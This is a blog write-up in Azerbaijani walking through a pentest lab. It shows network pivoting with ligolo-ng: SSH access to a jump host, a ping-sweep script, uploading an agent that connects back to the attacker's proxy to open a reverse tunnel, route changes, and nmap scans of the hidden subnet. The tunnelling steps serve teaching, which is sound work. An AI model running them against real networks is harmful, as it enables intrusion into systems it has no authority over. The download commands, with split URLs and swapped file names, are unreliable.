---
title: "Pivoting | Ligolo-ng"
date: 2025-11-17 10:30:00 +0400
categories: [Kiber-Təhlükəsizlik, Write-up]
tags: [ligolo-ng, pivoting, routing, nmap, lab, ssh]

image:
  path: assets/img/ligolo-post-picture.png
---

Salam! Bu, kiber-təhlükəsizlik sahəsindəki araşdırmalarımı və texniki "write-up"larımı paylaşacağım bu bloqdakı ilk postumdur. Ümid edirəm ki, burada paylaşacaqlarım həm mənim özüm, həm də oxuyanlar üçün faydalı olacaq.
İlk mövzu olaraq, pentest laboratoriyalarında çox tez-tez qarşılaşdığımız bir ssenaridən – **Pivoting**-dən danışmaq istəyirəm.

### Pivoting Nədir?

Qısaca desək, Pivoting, ələ keçirdiyimiz bir cihaza ("Jump Host") istinad edərək, o cihaz vasitəsilə birbaşa çıxışımız olmayan daxili şəbəkələrə keçid əldə etmək prosesidir.
Aşağıdakı şəkil bu konsepti vizual olaraq mükəmməl təsvir edir:

<img src="/assets/img/pivoting_image.jpg" 
     alt="Pivoting Konsepti" 
     style="display: block; margin-left: auto; margin-right: auto; width: 80%; max-width: 600px; border-radius: 8px;">
     
Bizim "Attacker" (hücum edən) olaraq "Target" (hədəf) serverə birbaşa çıxışımız "Not Allowed" (İcazə Verilmir) olaraq bloklanıb. Lakin, biz həm "Attacker" həm də "Target" şəbəkəsinə bağlı olan ortadakı "Pivot" cihazına ("Jump Host") çata bilirik. Bizim məqsədimiz məhz bu "Pivot" cihazından bir körpü kimi istifadə edərək "Target"-ə çatmaqdır.


Bunun üçün `ssh -D` və `proxychains` kimi çox populyar metodlar var. Lakin `proxychains` **yalnız Layer 4 (TCP)** trafikini dəstəkləyir.
Bu nə deməkdir?
1.  **`ping` (ICMP) işləmir:** Hostların "up" olub-olmadığını yoxlamaq üçün `ping` atmaq mümkün deyil, çünki `proxychains` ICMP-ni yönləndirə bilmir.
2.  **`nmap` Məhdudiyyətləri:** `nmap`-in yalnız ən səs-küylü və yavaş olan `-sT` (TCP Connect Scan) rejimindən istifadə edə bilirik. Daha sürətli olan `-sS` (SYN Scan) və ya `-sU` (UDP Scan) kimi kritik funksiyalar işləmir.

Bu məqalədə, biz daha güclü bir həll yoluna baxacağıq: **`ligolo-ng`**.
Bu alət bizə tam **Layer 3** səviyyəli bir tunel qurmağa imkan verir. Nəticədə, sanki öz Kali maşınımızın şəbəkə kabelini birbaşa o daxili şəbəkəyə qoşmuşuq kimi `ping`, TCP, UDP daxil olmaqla bütün trafikdən sərbəst istifadə edə bilirik.

Gəlin, VPN-ə qoşulmaqdan başlayaraq `ligolo-ng` ilə bu tam tuneli sıfırdan necə qurduğumuzu addım-addım nəzərdən keçirək.

---

### Mərhələ 1: VPN Qoşulması və "Jump Host"-un Təsdiqi

İlk olaraq, laboratoriya şəbəkəsinə çıxış əldə etmək üçün `openvpn` ilə bizə verilən konfiqurasiya faylına qoşuluruq.
```bash
┌──(root㉿Security)-[~]
└─# openvpn vpn.ovpn 
2025-11-16 16:43:11 OpenVPN 2.6.15 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
2025-11-16 16:43:11 library versions: OpenSSL 3.5.4 30 Sep 2025, LZO 2.10
2025-11-16 16:43:11 DCO version: N/A
Enter Auth Username: ****
Enter Auth Password: ••••••••                
2025-11-16 16:43:45 TCP/UDP: Preserving recently used remote address: [AF_INET]51.75.167.188:443
2025-11-16 16:43:45 Attempting to establish TCP connection with [AF_INET]51.75.167.188:443
2025-11-16 16:43:45 TCP connection established with [AF_INET]51.75.167.188:443
2025-11-16 16:43:45 TCPv4_CLIENT link local: (not bound)
2025-11-16 16:43:45 TCPv4_CLIENT link remote: [AF_INET]51.75.167.188:443
2025-11-16 16:43:45 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
2025-11-16 16:43:47 [CCRTA-Lab] Peer Connection Initiated with [AF_INET]51.75.167.188:443
2025-11-16 16:43:47 TUN/TAP device tun0 opened
2025-11-16 16:43:47 net_iface_mtu_set: mtu 1500 for tun0
2025-11-16 16:43:47 net_iface_up: set tun0 up
2025-11-16 16:43:47 net_addr_v4_add: 10.10.200.115/24 dev tun0
2025-11-16 16:43:47 Initialization Sequence Completed
```
VPN bizə `10.10.200.115` IP ünvanını və `tun0` interfeysini verdi. Növbəti addım, bizim "Jump Host" kimi istifadə edəcəyimiz `192.168.80.10` ünvanlı cihazın əlçatan olduğunu yoxlamaqdır.
```bash
┌──(root㉿Security)-[~]
└─# ping -c 2 192.168.80.10            
PING 192.168.80.10 (192.168.80.10) 56(84) bytes of data.
64 bytes from 192.168.80.10: icmp_seq=1 ttl=63 time=169 ms
64 bytes from 192.168.80.10: icmp_seq=2 ttl=63 time=193 ms
```
`ping` uğurla getdi. Artıq əlimizdə olan `privilege` istifadəçisinin parolu ilə bu cihaza `SSH` vasitəsilə daxil oluruq.
```bash
┌──(root㉿Security)-[~]
└─# ssh privilege@192.168.80.10 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
privilege@192.168.80.10's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-67-generic x86_64)

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Sat Jan 18 20:02:58 2025 from 10.10.200.3
privilege@ubuntu-virtual-machine:~$ 
```
---

### Mərhələ 2: Gizli Daxili Şəbəkənin Kəşfi

Cihaza daxil olan kimi, ip a əmri ilə onun şəbəkə interfeyslərinə baxırıq.
```bash
privilege@ubuntu-virtual-machine:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens34: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
    link/ether 00:50:56:96:ce:96 brd ff:ff:ff:ff:ff:ff
    altname enp2s2
    inet 192.168.98.15/24 brd 192.168.98.255 scope global noprefixroute ens34
       valid_lft forever preferred_lft forever
3: ens32: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:96:ae:25 brd ff:ff:ff:ff:ff:ff
    altname enp2s0
    inet 192.168.80.10/24 brd 192.168.80.255 scope global noprefixroute ens32
       valid_lft forever preferred_lft forever
```
Nəticələr çox maraqlıdır. Görürük ki, bu cihazın bizim qoşulduğumuz `192.168.80.10 (ens32)` interfeysindən başqa, həm də `192.168.98.15 (ens34)` ünvanına sahib ikinci bir interfeysi var. Bu, o deməkdir ki, o, `192.168.98.0/24` adlı ikinci, gizli bir daxili şəbəkəyə də bağlıdır.

Hədəfimiz artıq bəllidir: `192.168.98.0/24` şəbəkəsi. İndi bu daxili şəbəkədə hansı digər cihazların aktiv olduğunu tapmaq lazımdır.

"Jump Host" cihazında `nmap` və ya `netdiscover` kimi standart kəşfiyyat alətləri quraşdırılmamışdı. Buna görə də, 1-dən 254-ə qədər bütün IP ünvanlara `ping` sorğusu göndərən sadə bir "Bash for loop" skripti yazmaq qərarına gəldik. Bu skript, `ping` sorğusuna cavab verən hər bir hostu "HOST IS UP" olaraq bizə bildirəcək.
```bash
privilege@ubuntu-virtual-machine:~$ cat > script.sh
PREFIX="192.168.98" # <<<---- ÖZ ŞƏBƏKƏ PREFİKSİMIZ

for i in $(seq 1 254); do \
  (ping -c 1 -W 1 $PREFIX.$i > /dev/null && echo "$PREFIX.$i - HOST IS UP") & \
done
^C
privilege@ubuntu-virtual-machine:~$ chmod +x script.sh 
privilege@ubuntu-virtual-machine:~$ ./script.sh 
192.168.98.2 - HOST IS UP
192.168.98.15 - HOST IS UP
192.168.98.30 - HOST IS UP
192.168.98.120 - HOST IS UP
```
Beləcə, daxili şəbəkədə 4 aktiv host olduğunu öyrəndik. İndi əsas məsələyə, yəni bu hostlara öz Kali maşınımızdan çıxış əldə etmək üçün ligolo-ng ilə pivotinq qurmağa keçə bilərik.

---
### Mərhələ 3: Ligolo-ng Qurulumu və Marşrutların Düzəldilməsi

Bu əməliyyat üçün bizə `ligolo-ng`-nin iki əsas komponenti lazım olacaq:
1.  **Proxy:** Bizim Kali maşınımızda işləyəcək server faylı.
2.  **Agent:** "Jump Host"-a yükləyəcəyimiz müştəri (client) faylı.

İlk olaraq, hər iki faylı GitHub-dan öz Kali maşınımıza yükləyirik və arxivdən çıxarırıq.
```bash
# Proxy-ni yükləmək (Kali üçün)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng
_agent_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz

# Agent-i yükləmək (Jump Host üçün)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng
_proxy_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
```
Fayllar hazır olduqdan sonra, `agent` faylını `scp` vasitəsilə "Jump Host"-un `/tmp/` qovluğuna ötürürük.
```bash
┌──(root㉿Security)-[~]
└─# scp agent privilege@192.168.80.10:/tmp/agent
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
privilege@192.168.80.10's password: 
agent                                       100% 6324KB 657.8KB/s   00:09   
```
Agent faylı "Jump Host"-a göndərildi. İndi ən vacib yerə gəldik: marşrutları (routes) düzəltmək.

`ligolo-ng`-ni işə salmazdan əvvəl Kali maşınımızdakı kiçik bir problemi həll etməliyik.

**Problem nədir?** 
VPN-ə qoşulduğumuz üçün, sistemimiz avtomatik olaraq bir marşrut əlavə edib. Terminalda `ip route` yazsaq, görəcəyik ki, Kali maşınımız `192.168.98.0/24` şəbəkəsinə (bizim gizli şəbəkəmizə) `tun0 (VPN)` vasitəsilə çatmağa çalışır.
Ancaq biz bilirik ki, bu yol işləmir. Bizim yolumuz ligolo üzərindən olmalıdır.
Səhv marşrutu əl ilə düzəltməliyik:

1.  Köhnə (səhv) yolu silirik:
    ```bash
    sudo ip route del 192.168.98.0/24 dev tun0 
    ```

2.  `ligolo` adlı yeni bir virtual şəbəkə interfeysi yaradırıq.
    ```bash
    sudo ip tuntap add user $(whoami) mode tun ligolo
    ```

3.  Interfeysi up edirik:
    ```bash
    sudo ip link set ligolo up 
    ```

4.  Yeni (düzgün) yolu göstəririk:
    ```bash
    sudo ip route add 192.168.98.0/24 dev ligolo
    ```
Əmin olmaq üçün ip route əmri ilə marşrut cədvəlimizi yoxlayırıq:
![Interface proof](assets/img/ligolo_interface.png)

> {:.prompt-info}
**Qeyd:** Şəkildə linkdown yazısının görünməsi normaldır, çünki ligolo tuneli hələ tam aktivləşdirilməyib.

İndi tuneli başlatmağa hazırıq.

---
### Mərhələ 4: Tunelin Aktivləşdirilməsi

`proxy` və `agent`-i işə salaraq əlaqəni qura bilərik. "Reverse connection" (əks əlaqə) istifadə edəcəyik: `agent` ("Jump Host"-dan) bizim `proxy`-mizə (Kali maşınına) qoşulacaq.

**1. Kali maşınımızda, ligolo-proxy faylını sudo ilə işə salırıq.**
```bash
┌──(root㉿Security)-[~]
└─# ./proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng » 
```
Bu əmr, proxy-ni 11601 portunda (standart) qoşulmaları gözləmə rejiminə salır.

`-selfcert` flag-i, əlaqəni şifrələmək üçün avtomatik olaraq "özü-imzalanmış" (self-signed) bir TLS sertifikatı yaradır.

**2. "Jump Host"-da (SSH Sessiyası) agent-i başladırıq**
```bash
# "Jump Host" SSH sessiyasında
# 10.10.200.115 - host kompüterimizin VPN IP-sidir
./agent -connect 10.10.200.115:11601 -ignore-cert
```
Qoşulduğuna dair təsdiq cavabı gəlir:
```bash
privilege@ubuntu-virtual-machine:/tmp$ ./agent -connect 10.10.200.115:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.200.115:11601"
```

**3. Öz Host Maşınımızda (Kali) Sessiyanı başladırıq**

İndi tuneli aktivləşdirmək üçün `session` əmrini yazırıq. Yeganə aktiv sessiya olduğu üçün `ligolo-ng` avtomatik olaraq onu seçir:
```bash
ligolo-ng » session
? Specify a session : 1 - privilege@ubuntu-virtual-machine - 192.168.80.10:44054 - 00505696ce96
[Agent : privilege@ubuntu-virtual-machine] »
```
Artıq agentin idarəetmə panelindəyik. `start` əmrini verməzdən əvvəl, `tunnel_list` ilə mövcud vəziyyəti yoxlayaq.
```bash
[Agent : privilege@ubuntu-virtual-machine] » tunnel_list
┌────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Active sessions and tunnels                                                                    │
├───┬───────────────────────────────────────────────────────────────────────┬───────────┬────────┤
│ # │ AGENT                                                                 │ INTERFACE │ STATUS │
├───┼───────────────────────────────────────────────────────────────────────┼───────────┼────────┤
│ 1 │ privilege@ubuntu-virtual-machine - 192.168.80.10:44054 - 00505696ce96 │           │ Online │
└───┴───────────────────────────────────────────────────────────────────────┴───────────┴────────┘
[Agent : privilege@ubuntu-virtual-machine] » start
INFO[0059] Starting tunnel to privilege@ubuntu-virtual-machine (00505696ce96) 
```
Gördüyümüz kimi, sessiya `Online` statusundadır, lakin `INTERFACE` sütunu hələ boşdur. Bu, tunelin hələ aktivləşdirilmədiyini göstərir.
İndi `start` əmri ilə tuneli aktivləşdiririk.
```bash
[Agent : privilege@ubuntu-virtual-machine] » start
INFO[0059] Starting tunnel to privilege@ubuntu-virtual-machine (00505696ce96) 
[Agent : privilege@ubuntu-virtual-machine] » tunnel_list
┌────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Active sessions and tunnels                                                                    │
├───┬───────────────────────────────────────────────────────────────────────┬───────────┬────────┤
│ # │ AGENT                                                                 │ INTERFACE │ STATUS │
├───┼───────────────────────────────────────────────────────────────────────┼───────────┼────────┤
│ 1 │ privilege@ubuntu-virtual-machine - 192.168.80.10:44054 - 00505696ce96 │ ligolo    │ Online │
└───┴───────────────────────────────────────────────────────────────────────┴───────────┴────────┘
```
Tunel tam aktivdir.

---
### Mərhələ 5: Nəticə və Yoxlama

Tunel aktivdir, marşrutlar düzgündür. Indi isə yoxlayaq görək Kali maşınımızdan birbaşa daxili şəbəkədəki `192.168.98.2` hostuna ping gedəcək?

Yeni bir terminal açırıq və yoxlayırıq:
```bash
┌──(root㉿Security)-[~]
└─# ping 192.168.98.2
PING 192.168.98.2 (192.168.98.2) 56(84) bytes of data.
64 bytes from 192.168.98.2: icmp_seq=1 ttl=64 time=529 ms
64 bytes from 192.168.98.2: icmp_seq=2 ttl=64 time=351 ms
64 bytes from 192.168.98.2: icmp_seq=3 ttl=64 time=475 ms
^C
--- 192.168.98.2 ping statistics ---
4 packets transmitted, 3 received, 25% packet loss...
```
Mükəmməl! Paketlər gedib çatır.

Biz uğurla "Jump Host" üzərindən daxili şəbəkəyə pivotinq etdik. Artıq bu daxili şəbəkədə `nmap`, `metasploit` və digər bütün alətlərimizi birbaşa öz Kali maşınımızdan işlədə bilərik.

`nmap` nümunəsi:
```bash
┌──(root㉿Security)-[~]
└─# nmap -sn -PE -T2 192.168.98.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-16 20:13 +04
Stats: 0:00:15 elapsed; 0 hosts completed (0 up), 256 undergoing Ping Scan
Ping Scan Timing: About 2.93% done; ETC: 20:21 (0:08:17 remaining)
Stats: 0:07:29 elapsed; 0 hosts completed (0 up), 256 undergoing Ping Scan
Ping Scan Timing: About 86.91% done; ETC: 20:21 (0:01:08 remaining)
Nmap scan report for 192.168.98.2
Host is up (0.35s latency).
Nmap scan report for 192.168.98.15
Host is up (0.56s latency).
Nmap scan report for 192.168.98.30
Host is up (0.52s latency).
Nmap scan report for 192.168.98.120
Host is up (0.51s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 504.33 seconds
```